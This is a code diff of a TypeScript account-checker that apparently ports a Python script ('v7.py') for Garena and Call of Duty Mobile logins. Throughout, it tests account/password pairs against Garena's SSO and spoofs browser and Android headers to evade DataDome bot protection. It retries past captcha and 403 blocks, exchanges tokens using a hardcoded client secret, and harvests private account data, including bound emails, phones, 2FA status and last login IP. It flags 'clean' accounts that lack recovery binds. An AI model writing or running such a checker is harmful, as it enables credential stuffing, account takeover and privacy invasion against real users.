@@ -86,7 +86,7 @@ async function sha256(message: string): Promise<string> {
   return bytesToHex(new Uint8Array(hash));
 }
 
-// AES-128 ECB encryption
+// AES-128 ECB encryption (matching v7.py encode function)
 function aesEcbEncrypt(plainHex: string, keyHex: string): string {
   const pt = hexToBytes(plainHex), key = hexToBytes(keyHex);
   const sBox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
@@ -112,7 +112,7 @@ function aesEcbEncrypt(plainHex: string, keyHex: string): string {
     roundKeys.push(rk);
   }
 
-  const result: number[] = [];
+  const resultArr: number[] = [];
   for (let b = 0; b < pt.length; b += 16) {
     const state: number[][] = [[],[],[],[]];
     for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) state[r][c] = pt[b + c*4 + r] || 0;
@@ -144,13 +144,14 @@ function aesEcbEncrypt(plainHex: string, keyHex: string): string {
     }
     for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[10][i][j];
     
-    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) result.push(state[r][c]);
+    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) resultArr.push(state[r][c]);
   }
   
-  return bytesToHex(new Uint8Array(result)).substring(0, 32);
+  return bytesToHex(new Uint8Array(resultArr)).substring(0, 32);
 }
 
-// Hash password using the exact algorithm from Python: MD5 -> SHA256(md5+v1) -> SHA256(result+v2) -> AES_ECB(md5, outer_hash)
+// Hash password: MD5 -> SHA256(md5+v1) -> SHA256(result+v2) -> AES_ECB(md5, outer_hash)
+// Matches v7.py: hash_password(password, v1, v2)
 async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
   const passMd5 = md5(decodeURIComponent(password));
   const innerHash = await sha256(passMd5 + v1);
@@ -162,12 +163,11 @@ async function hashPassword(password: string, v1: string, v2: string): Promise<s
 // Retry configuration
 const RETRY_CONFIG = {
   maxRetries: 3,
-  baseDelay: 1000, // 1 second
-  maxDelay: 5000,  // 5 seconds max
+  baseDelay: 1000,
+  maxDelay: 5000,
 };
 
-// Delay helper with exponential backoff
-async function delay(attempt: number): Promise<void> {
+async function retryDelay(attempt: number): Promise<void> {
   const delayMs = Math.min(
     RETRY_CONFIG.baseDelay * Math.pow(2, attempt) + Math.random() * 500,
     RETRY_CONFIG.maxDelay
@@ -176,7 +176,7 @@ async function delay(attempt: number): Promise<void> {
   await new Promise(resolve => setTimeout(resolve, delayMs));
 }
 
-// Get DataDome cookie with retry
+// Get DataDome cookie - matches v7.py get_datadome_cookie()
 async function getDataDomeCookie(): Promise<string | null> {
   try {
     const url = 'https://dd.garena.com/js/';
@@ -222,10 +222,19 @@ async function getDataDomeCookie(): Promise<string | null> {
       method: 'POST',
       headers: {
         'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br, zstd',
         'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'no-cache',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://account.garena.com',
+        'pragma': 'no-cache',
         'referer': 'https://account.garena.com/',
+        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
       },
       body: payload.toString()
@@ -246,127 +255,209 @@ async function getDataDomeCookie(): Promise<string | null> {
   }
 }
 
-// Prelogin - GET method with app_id=10100
-async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string } | null> {
-  const timestamp = Date.now();
-  const params = new URLSearchParams({
-    app_id: '10100',
-    account: account,
-    format: 'json',
-    id: String(timestamp)
-  });
+// Prelogin - matches v7.py prelogin() with retry on 403
+async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string; newDatadome?: string } | null> {
+  const retries = 3;
+  
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try {
+      const timestamp = Date.now();
+      const params = new URLSearchParams({
+        app_id: '10100',
+        account: account,
+        format: 'json',
+        id: String(timestamp)
+      });
 
-  const url = `https://sso.garena.com/api/prelogin?${params.toString()}`;
-  
-  console.log('[PRELOGIN] Requesting for:', account);
-  
-  const response = await fetch(url, {
-    method: 'GET',
-    headers: {
-      'accept': 'application/json, text/plain, */*',
-      'accept-language': 'en-US,en;q=0.9',
-      'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
-      'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
-      'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': '"Windows"',
-      'sec-fetch-dest': 'empty',
-      'sec-fetch-mode': 'cors',
-      'sec-fetch-site': 'same-origin',
-      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-      'cookie': `datadome=${datadome}`
-    }
-  });
+      const url = `https://sso.garena.com/api/prelogin?${params.toString()}`;
+      
+      console.log(`[PRELOGIN] Attempt ${attempt + 1}/${retries} for ${account}`);
+      
+      const response = await fetch(url, {
+        method: 'GET',
+        headers: {
+          'accept': 'application/json, text/plain, */*',
+          'accept-encoding': 'gzip, deflate, br, zstd',
+          'accept-language': 'en-US,en;q=0.9',
+          'connection': 'keep-alive',
+          'host': 'sso.garena.com',
+          'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
+          'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'same-origin',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+          'cookie': `datadome=${datadome}`
+        }
+      });
 
-  console.log('[PRELOGIN] Status:', response.status);
-  
-  if (response.status === 403) {
-    console.log('[PRELOGIN] 403 - DataDome blocked');
-    return null;
-  }
-  
-  const text = await response.text();
-  console.log('[PRELOGIN] Response:', text.substring(0, 200));
-  
-  try {
-    const data = JSON.parse(text);
-    if (data.v1 && data.v2) {
-      console.log('[PRELOGIN] Success - got v1/v2');
-      return { v1: data.v1, v2: data.v2 };
+      console.log('[PRELOGIN] Status:', response.status);
+      
+      // Extract new datadome from response cookies
+      let newDatadome: string | undefined;
+      const setCookie = response.headers.get('set-cookie') || '';
+      if (setCookie.includes('datadome=')) {
+        const match = setCookie.match(/datadome=([^;]+)/);
+        if (match) {
+          newDatadome = match[1];
+          datadome = newDatadome; // Use new datadome for next attempt
+          console.log('[PRELOGIN] Got new datadome from response');
+        }
+      }
+      
+      if (response.status === 403) {
+        console.log('[PRELOGIN] 403 - DataDome blocked');
+        if (newDatadome && attempt < retries - 1) {
+          console.log('[PRELOGIN] Retrying with new cookies from 403...');
+          await new Promise(resolve => setTimeout(resolve, 100));
+          continue;
+        }
+        return null;
+      }
+      
+      const text = await response.text();
+      console.log('[PRELOGIN] Response:', text.substring(0, 200));
+      
+      try {
+        const data = JSON.parse(text);
+        
+        if (data.error) {
+          console.log('[PRELOGIN] Error:', data.error);
+          return null;
+        }
+        
+        if (data.v1 && data.v2) {
+          console.log('[PRELOGIN] Success - got v1/v2');
+          return { v1: data.v1, v2: data.v2, newDatadome };
+        }
+      } catch (e) {
+        console.log('[PRELOGIN] Parse error');
+        if (attempt < retries - 1) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+          continue;
+        }
+      }
+      
+      return null;
+    } catch (e) {
+      console.log(`[PRELOGIN] Error attempt ${attempt + 1}:`, e);
+      if (attempt < retries - 1) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+        continue;
+      }
     }
-    if (data.error) {
-      console.log('[PRELOGIN] Error:', data.error);
-    }
-  } catch (e) {
-    console.log('[PRELOGIN] Parse error');
   }
   
   return null;
 }
 
-// Login - GET method
+// Login - matches v7.py login() with retry
 async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string } | { error: string }> {
   const hashedPassword = await hashPassword(password, v1, v2);
-  const timestamp = Date.now();
   
-  const params = new URLSearchParams({
-    app_id: '10100',
-    account: account,
-    password: hashedPassword,
-    redirect_uri: 'https://account.garena.com/',
-    format: 'json',
-    id: String(timestamp)
-  });
+  const retries = 3;
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try {
+      const timestamp = Date.now();
+      const params = new URLSearchParams({
+        app_id: '10100',
+        account: account,
+        password: hashedPassword,
+        redirect_uri: 'https://account.garena.com/',
+        format: 'json',
+        id: String(timestamp)
+      });
 
-  const url = `https://sso.garena.com/api/login?${params.toString()}`;
-  
-  console.log('[LOGIN] Attempting for:', account);
-  
-  const response = await fetch(url, {
-    method: 'GET',
-    headers: {
-      'accept': 'application/json, text/plain, */*',
-      'referer': 'https://account.garena.com/',
-      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
-      'cookie': `datadome=${datadome}`
-    }
-  });
+      const url = `https://sso.garena.com/api/login?${params.toString()}`;
+      
+      console.log(`[LOGIN] Attempt ${attempt + 1}/${retries} for: ${account}`);
+      
+      const response = await fetch(url, {
+        method: 'GET',
+        headers: {
+          'accept': 'application/json, text/plain, */*',
+          'referer': 'https://account.garena.com/',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
+          'cookie': `datadome=${datadome}`
+        }
+      });
 
-  console.log('[LOGIN] Status:', response.status);
-  
-  // Extract sso_key from cookies
-  const setCookie = response.headers.get('set-cookie') || '';
-  let ssoKey = '';
-  
-  if (setCookie.includes('sso_key=')) {
-    const match = setCookie.match(/sso_key=([^;]+)/);
-    if (match) ssoKey = match[1];
-  }
-  
-  const text = await response.text();
-  console.log('[LOGIN] Response:', text.substring(0, 300));
-  
-  try {
-    const data = JSON.parse(text);
-    
-    if (ssoKey || data.sso_key || data.session_key) {
-      return { ssoKey: ssoKey || data.sso_key || data.session_key };
+      console.log('[LOGIN] Status:', response.status);
+      
+      // Extract sso_key from set-cookie header
+      const setCookie = response.headers.get('set-cookie') || '';
+      let ssoKey = '';
+      
+      if (setCookie.includes('sso_key=')) {
+        const match = setCookie.match(/sso_key=([^;]+)/);
+        if (match) ssoKey = match[1];
+      }
+      
+      // Also extract new datadome if present
+      if (setCookie.includes('datadome=')) {
+        const match = setCookie.match(/datadome=([^;]+)/);
+        if (match) datadome = match[1];
+      }
+      
+      const text = await response.text();
+      console.log('[LOGIN] Response:', text.substring(0, 300));
+      
+      try {
+        const data = JSON.parse(text);
+        
+        if (data.error) {
+          const errorMsg = data.error;
+          console.log('[LOGIN] Error:', errorMsg);
+          
+          // These errors are not retryable
+          if (errorMsg === 'ACCOUNT DOESNT EXIST' || errorMsg.includes('password')) {
+            return { error: errorMsg };
+          }
+          
+          // Captcha - wait and retry
+          if (errorMsg.toLowerCase().includes('captcha')) {
+            console.log('[LOGIN] Captcha required, waiting...');
+            if (attempt < retries - 1) {
+              await new Promise(resolve => setTimeout(resolve, 3000));
+              continue;
+            }
+          }
+          
+          return { error: errorMsg };
+        }
+        
+        // Check for sso_key in response
+        const responseSsoKey = ssoKey || data.sso_key || data.session_key;
+        if (responseSsoKey) {
+          return { ssoKey: responseSsoKey };
+        }
+      } catch (e) {
+        console.log('[LOGIN] Parse error');
+        if (attempt < retries - 1) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+          continue;
+        }
+      }
+      
+      if (ssoKey) {
+        return { ssoKey };
+      }
+      
+    } catch (e) {
+      console.log(`[LOGIN] Error attempt ${attempt + 1}:`, e);
+      if (attempt < retries - 1) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+        continue;
+      }
     }
-    
-    if (data.error) {
-      return { error: data.error };
-    }
-  } catch (e) {
-    console.log('[LOGIN] Parse error');
   }
   
-  if (ssoKey) {
-    return { ssoKey };
-  }
-  
-  return { error: 'Login failed' };
+  return { error: 'Login failed after retries' };
 }
 
-// Get account info
+// Get account info - matches v7.py account init
 async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<string, unknown> | null> {
   try {
     const response = await fetch('https://account.garena.com/api/account/init', {
@@ -379,9 +470,20 @@ async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<
       }
     });
 
+    if (response.status === 403) {
+      console.log('[ACCOUNT] 403 - Blocked');
+      return null;
+    }
+
     if (response.ok) {
       const data = await response.json();
       console.log('[ACCOUNT] Got info');
+      
+      if (data.error) {
+        console.log('[ACCOUNT] Error:', data.error);
+        return null;
+      }
+      
       return data;
     }
   } catch (e) {
@@ -390,72 +492,225 @@ async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<
   return null;
 }
 
-// Get CODM access token
-async function getCodmAccessToken(ssoKey: string): Promise<string | null> {
+// Get CODM access token - NEW OAuth flow matching v7.py get_codm_access_token()
+// Uses authorization code grant with 100082.connect.garena.com
+async function getCodmAccessToken(ssoKey: string, datadome: string): Promise<{ accessToken: string; openId: string; uid: string } | null> {
   try {
-    const timestamp = Date.now();
-    const url = 'https://auth.garena.com/oauth/token/grant';
-    const data = `client_id=100082&response_type=token&redirect_uri=${encodeURIComponent('https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/')}&format=json&id=${timestamp}`;
+    // Step 1: Get authorization code
+    const randomId = String(Date.now());
+    const grantUrl = "https://100082.connect.garena.com/oauth/token/grant";
     
-    const response = await fetch(url, {
+    const grantHeaders: Record<string, string> = {
+      "Host": "100082.connect.garena.com",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": '"Android"',
+      "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
+      "Accept": "application/json, text/plain, */*",
+      "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
+      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+      "sec-ch-ua-mobile": "?1",
+      "Origin": "https://100082.connect.garena.com",
+      "X-Requested-With": "com.garena.game.codm",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "cors",
+      "Sec-Fetch-Dest": "empty",
+      "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "en-US,en;q=0.9",
+      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
+    };
+    
+    const grantData = `client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id=${randomId}`;
+    
+    const grantResponse = await fetch(grantUrl, {
       method: 'POST',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36',
-        'Accept': '*/*',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
-        'cookie': `sso_key=${ssoKey}`
-      },
-      body: data
+      headers: grantHeaders,
+      body: grantData
     });
-
-    const result = await response.json();
-    console.log('[CODM_TOKEN] Response:', JSON.stringify(result).substring(0, 100));
-    return result.access_token || null;
+    
+    const grantJson = await grantResponse.json();
+    console.log('[CODM_TOKEN] Grant response:', JSON.stringify(grantJson).substring(0, 150));
+    
+    const authCode = grantJson.code || '';
+    if (!authCode) {
+      console.log('[CODM_TOKEN] No auth code received');
+      return null;
+    }
+    
+    // Step 2: Exchange authorization code for access token
+    const tokenUrl = "https://100082.connect.garena.com/oauth/token/exchange";
+    
+    // Generate device_id
+    const deviceId = `02-${crypto.randomUUID()}`;
+    
+    const tokenHeaders: Record<string, string> = {
+      "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Host": "100082.connect.garena.com",
+      "Connection": "Keep-Alive",
+      "Accept-Encoding": "gzip",
+      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
+    };
+    
+    const tokenData = `grant_type=authorization_code&code=${authCode}&device_id=${deviceId}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415`;
+    
+    const tokenResponse = await fetch(tokenUrl, {
+      method: 'POST',
+      headers: tokenHeaders,
+      body: tokenData
+    });
+    
+    const tokenJson = await tokenResponse.json();
+    console.log('[CODM_TOKEN] Token response:', JSON.stringify(tokenJson).substring(0, 150));
+    
+    const accessToken = tokenJson.access_token || '';
+    const openId = tokenJson.open_id || '';
+    const uid = tokenJson.uid || '';
+    
+    if (!accessToken) {
+      console.log('[CODM_TOKEN] No access token received');
+      return null;
+    }
+    
+    return { accessToken, openId, uid };
   } catch (e) {
     console.log('[CODM_TOKEN] Error:', e);
     return null;
   }
 }
 
-// Process CODM callback
+// Process CODM callback - matches v7.py process_codm_callback()
+// Tries both old (non-AOS) and new (AOS) endpoints
 async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
   try {
-    const apiCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
+    // Method 1: Try old endpoint (non-AOS) first
+    const oldCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
     
-    const response = await fetch(apiCallbackUrl, {
+    const oldResponse = await fetch(oldCallbackUrl, {
       method: 'GET',
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml',
-        'Referer': 'https://auth.garena.com/'
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
+        'referer': 'https://auth.garena.com/'
       },
       redirect: 'manual'
     });
 
-    const location = response.headers.get('location') || '';
-    console.log('[CODM_CALLBACK] Location:', location.substring(0, 100));
+    const oldLocation = oldResponse.headers.get('location') || '';
+    console.log('[CODM_CALLBACK] Old endpoint location:', oldLocation.substring(0, 100));
     
-    if (location.includes('err=3')) {
+    if (oldLocation.includes('err=3')) {
+      // Try AOS endpoint before returning no_codm
+    } else if (oldLocation.includes('token=')) {
+      const token = oldLocation.split('token=')[1]?.split('&')[0];
+      if (token) return { token, status: 'success' };
+    }
+    
+    // Method 2: Try new AOS endpoint
+    const aosCallbackUrl = `https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
+    
+    const aosResponse = await fetch(aosCallbackUrl, {
+      method: 'GET',
+      headers: {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
+        'referer': 'https://100082.connect.garena.com/',
+        'x-requested-with': 'com.garena.game.codm'
+      },
+      redirect: 'manual'
+    });
+
+    const aosLocation = aosResponse.headers.get('location') || '';
+    console.log('[CODM_CALLBACK] AOS endpoint location:', aosLocation.substring(0, 100));
+    
+    if (aosLocation.includes('err=3')) {
       return { token: null, status: 'no_codm' };
     }
     
-    if (location.includes('token=')) {
-      const token = location.split('token=')[1]?.split('&')[0];
-      return { token, status: 'success' };
+    if (aosLocation.includes('token=')) {
+      const token = aosLocation.split('token=')[1]?.split('&')[0];
+      if (token) return { token, status: 'success' };
     }
     
-    return { token: null, status: 'unknown' };
+    // If old endpoint had err=3, report no_codm
+    if (oldLocation.includes('err=3')) {
+      return { token: null, status: 'no_codm' };
+    }
+    
+    return { token: null, status: 'unknown_error' };
   } catch (e) {
     console.log('[CODM_CALLBACK] Error:', e);
     return { token: null, status: 'error' };
   }
 }
 
-// Get CODM user info
+// Get CODM user info - matches v7.py get_codm_user_info()
+// First tries JWT decode, then falls back to AOS API endpoint
 async function getCodmUserInfo(token: string): Promise<Record<string, unknown> | null> {
   try {
-    const response = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', {
+    // Method 1: Try JWT decode first (faster, no network request)
+    try {
+      const parts = token.split('.');
+      if (parts.length === 3) {
+        let payload = parts[1];
+        // Add padding
+        const padding = 4 - (payload.length % 4);
+        if (padding !== 4) {
+          payload += '='.repeat(padding);
+        }
+        
+        // Base64url decode
+        const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+        const jwtData = JSON.parse(decoded);
+        
+        const userData = jwtData.user || {};
+        if (userData && (userData.codm_nickname || userData.nickname)) {
+          console.log('[CODM_USER] Got info from JWT decode');
+          return {
+            codm_nickname: userData.codm_nickname || userData.nickname || 'N/A',
+            codm_level: userData.codm_level || 'N/A',
+            region: userData.region || 'N/A',
+            uid: userData.uid || 'N/A',
+            open_id: userData.open_id || 'N/A',
+            t_open_id: userData.t_open_id || 'N/A'
+          };
+        }
+      }
+    } catch (e) {
+      console.log('[CODM_USER] JWT decode failed, trying API...');
+    }
+    
+    // Method 2: Try AOS API endpoint (matching v7.py)
+    const aosUrl = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/";
+    const aosResponse = await fetch(aosUrl, {
+      method: 'GET',
+      headers: {
+        'accept': 'application/json, text/plain, */*',
+        'codm-delete-token': token,
+        'origin': 'https://delete-request-aos.codm.garena.co.id',
+        'referer': 'https://delete-request-aos.codm.garena.co.id/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
+        'x-requested-with': 'com.garena.game.codm'
+      }
+    });
+
+    const aosData = await aosResponse.json();
+    console.log('[CODM_USER] AOS Response:', JSON.stringify(aosData).substring(0, 200));
+    
+    if (aosData.user) {
+      return {
+        codm_nickname: aosData.user.codm_nickname || 'N/A',
+        codm_level: aosData.user.codm_level || 'N/A',
+        region: aosData.user.region || 'N/A',
+        uid: aosData.user.uid || 'N/A',
+        open_id: aosData.user.open_id || 'N/A',
+        t_open_id: aosData.user.t_open_id || 'N/A'
+      };
+    }
+    
+    // Method 3: Fallback to old endpoint
+    const oldUrl = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
+    const oldResponse = await fetch(oldUrl, {
       method: 'GET',
       headers: {
         'Accept': 'application/json, text/plain, */*',
@@ -466,18 +721,20 @@ async function getCodmUserInfo(token: string): Promise<Record<string, unknown> |
       }
     });
 
-    const data = await response.json();
-    console.log('[CODM_USER] Response:', JSON.stringify(data).substring(0, 200));
+    const oldData = await oldResponse.json();
+    console.log('[CODM_USER] Old Response:', JSON.stringify(oldData).substring(0, 200));
     
-    if (data.user) {
+    if (oldData.user) {
       return {
-        codm_nickname: data.user.codm_nickname || 'N/A',
-        codm_level: data.user.codm_level || 'N/A',
-        codm_region: data.user.region || 'N/A',
-        codm_uid: data.user.uid || 'N/A',
-        codm_open_id: data.user.open_id || 'N/A'
+        codm_nickname: oldData.user.codm_nickname || 'N/A',
+        codm_level: oldData.user.codm_level || 'N/A',
+        region: oldData.user.region || 'N/A',
+        uid: oldData.user.uid || 'N/A',
+        open_id: oldData.user.open_id || 'N/A',
+        t_open_id: oldData.user.t_open_id || 'N/A'
       };
     }
+    
     return null;
   } catch (e) {
     console.log('[CODM_USER] Error:', e);
@@ -485,23 +742,64 @@ async function getCodmUserInfo(token: string): Promise<Record<string, unknown> |
   }
 }
 
-// Parse account details from API response
+// Parse account details - matches v7.py parse_account_details()
 function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
   const userInfo = (data.user_info || data) as Record<string, unknown>;
   
-  const email = userInfo.email as string || 'N/A';
+  const email = (userInfo.email as string) || 'N/A';
   const emailVerified = Boolean(userInfo.email_v);
-  const mobileNo = userInfo.mobile_no as string || '';
+  const mobileNo = (userInfo.mobile_no as string) || '';
   const fbConnected = Boolean(userInfo.is_fbconnect_enabled);
-  const idCard = userInfo.idcard as string || '';
+  const fbAccount = (userInfo.fb_account as Record<string, unknown>) || {};
+  const idCard = (userInfo.idcard as string) || '';
+  const accCountry = (userInfo.acc_country as string) || 'N/A';
+  const countryCode = (userInfo.country_code as string) || 'N/A';
   
+  // Build binds array - matching v7.py logic exactly
   const binds: string[] = [];
-  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@')) binds.push('Email');
+  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@') && !email.endsWith('@gmail.com') && !email.includes('****')) {
+    binds.push('Email');
+  }
   if (mobileNo && mobileNo.trim()) binds.push('Phone');
   if (fbConnected) binds.push('Facebook');
   if (idCard && idCard.trim()) binds.push('ID Card');
   
+  // Clean status: clean only if no email verified AND no binds
   const isClean = !emailVerified && binds.length === 0;
+  
+  // Security info
+  const twoStepVerify = Boolean(userInfo.two_step_verify_enable);
+  const authenticator = Boolean(userInfo.authenticator_enable);
+  const suspicious = Boolean(userInfo.suspicious);
+  
+  const securityIndicators: string[] = [];
+  if (twoStepVerify) securityIndicators.push('2FA');
+  if (authenticator) securityIndicators.push('Auth App');
+  if (suspicious) securityIndicators.push('Suspicious');
+  
+  // Facebook details
+  const fbUid = typeof fbAccount === 'object' && fbAccount ? (fbAccount.fb_uid as string) || 'N/A' : 'N/A';
+  const fbLinked = fbConnected ? `Linked (${fbUid})` : 'Not Linked';
+  const fbProfile = fbConnected && fbUid !== 'N/A' ? `https://facebook.com/${fbUid}` : 'N/A';
+  
+  // Login history
+  const loginHistory = (data.login_history as Array<Record<string, unknown>>) || [];
+  let lastLoginIp = 'N/A';
+  let lastLoginWhere = 'N/A';
+  let lastLogin = 'Unknown';
+  
+  if (Array.isArray(loginHistory) && loginHistory.length > 0) {
+    const entry = loginHistory[0];
+    lastLoginIp = (entry.ip as string) || (entry.login_ip as string) || (entry.ip_address as string) || 'N/A';
+    lastLoginWhere = (entry.country as string) || (entry.location as string) || (entry.region as string) || 'N/A';
+    const ts = entry.timestamp;
+    if (ts) {
+      try {
+        const tsInt = Number(ts);
+        lastLogin = new Date(tsInt * 1000).toISOString().replace('T', ' ').split('.')[0] + ' UTC';
+      } catch { lastLogin = 'Unknown'; }
+    }
+  }
   
   return {
     uid: userInfo.uid || 'N/A',
